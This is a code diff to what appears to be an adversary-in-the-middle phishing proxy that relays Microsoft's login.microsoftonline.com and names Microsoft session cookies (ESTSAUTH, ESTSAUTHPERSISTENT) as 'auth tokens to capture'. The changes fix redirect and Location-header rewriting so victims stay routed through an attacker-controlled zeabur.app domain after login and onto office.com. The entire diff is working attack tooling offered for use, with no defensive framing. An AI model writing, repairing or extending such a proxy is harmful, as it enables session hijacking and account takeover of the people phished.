@@ -7,7 +7,7 @@ const INITIAL_UPSTREAM = 'login.microsoftonline.com';
 const PROXY_PREFIX = '/_p/';
 const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];
 
-// Auth tokens to capture (only these specific cookies)
+// Auth tokens to capture
 const AUTH_TOKEN_NAMES = [
   'ESTSAUTH',
   'ESTSAUTHPERSISTENT', 
@@ -146,18 +146,22 @@ function parseUrl(pathname, search) {
   let isProxied = false;
   
   for (const segment of segments) {
+    // Skip our domain in the chain - it's just a redirect marker
     if (segment.domain === YOUR_DOMAIN || segment.domain.endsWith(YOUR_DOMAIN)) {
       console.log(`[PARSE] Skipping self-domain: ${segment.domain}`);
       continue;
     }
     
+    // Found a real upstream
     upstreamDomain = segment.domain;
     upstreamPath = segment.path || '/';
     isProxied = true;
     break;
   }
   
+  // If no upstream found (all segments were our domain), this is a post-login path
   if (!upstreamDomain) {
+    // Check if the remaining path has an embedded URL
     const embeddedMatch = path.match(/.*\/https?:\/?\/?([^\/]+)(.*)/);
     
     if (embeddedMatch) {
@@ -208,7 +212,7 @@ function shouldProxyDomain(hostname) {
   return false;
 }
 
-// ==================== LOCATION REWRITING ====================
+// ==================== CRITICAL FIX: LOCATION REWRITING ====================
 
 function rewriteLocation(location, currentUpstream) {
   try {
@@ -216,7 +220,26 @@ function rewriteLocation(location, currentUpstream) {
     
     console.log(`[REWRITE] Location: ${location}, currentUpstream: ${currentUpstream}`);
     
+    // Already our domain - check if it's a valid proxied URL or needs fixing
     if (url.hostname === YOUR_DOMAIN || url.hostname.endsWith(`.${YOUR_DOMAIN}`)) {
+      // Check if the path is already properly proxied
+      if (url.pathname.startsWith(PROXY_PREFIX)) {
+        // Check for malformed recursive URLs like /_p/www.ayola-ozamu.zeabur.app/_p/office.com/
+        const recursiveMatch = url.pathname.match(/^\/_p\/[^\/]+\.zeabur\.app\/_p\/(.+)$/);
+        if (recursiveMatch) {
+          // Fix malformed URL: extract the real upstream
+          const fixedPath = '/_p/' + recursiveMatch[1];
+          const result = `https://${YOUR_DOMAIN}${fixedPath}${url.search}`;
+          console.log(`[REWRITE] Fixed recursive URL: ${result}`);
+          return result;
+        }
+        
+        console.log(`[REWRITE] Already proxied correctly: ${location}`);
+        return location;
+      }
+      
+      // Check for embedded Microsoft path in our domain URL
+      // Microsoft sometimes does: https://yourdomain.com/common/https://microsoft.com/path
       const doubleHttpMatch = url.pathname.match(/(.*)\/https?:\/?\/?([^\/]+)(.*)/);
       
       if (doubleHttpMatch) {
@@ -230,10 +253,21 @@ function rewriteLocation(location, currentUpstream) {
         }
       }
       
-      console.log(`[REWRITE] Already our domain, keeping: ${location}`);
+      // Pure self-domain path - this shouldn't happen in normal flow
+      // but if it does, we need to determine where to route it
+      console.log(`[REWRITE] Self-domain path detected: ${url.pathname}`);
+      
+      // If it's a post-login landing page, route to office.com
+      if (url.pathname.includes('/landing') || url.pathname.includes('/kmsi')) {
+        const result = `https://${YOUR_DOMAIN}${PROXY_PREFIX}www.office.com${url.pathname}${url.search}`;
+        console.log(`[REWRITE] Routing landing page to office.com: ${result}`);
+        return result;
+      }
+      
       return location;
     }
     
+    // External domain - proxy it
     if (shouldProxyDomain(url.hostname)) {
       const result = `https://${YOUR_DOMAIN}${PROXY_PREFIX}${url.hostname}${url.pathname}${cleanQueryString(url.search)}`;
       console.log(`[REWRITE] Proxy external: ${result}`);
@@ -244,9 +278,11 @@ function rewriteLocation(location, currentUpstream) {
     return location;
     
   } catch (e) {
+    // Relative URL or malformed
     console.log(`[REWRITE] Relative/malformed: ${location}`);
     
     if (location.startsWith('/') && currentUpstream) {
+      // Check for embedded protocol
       const embeddedMatch = location.match(/(.*)\/https?:\/?\/?([^\/]+)(.*)/);
       
       if (embeddedMatch) {
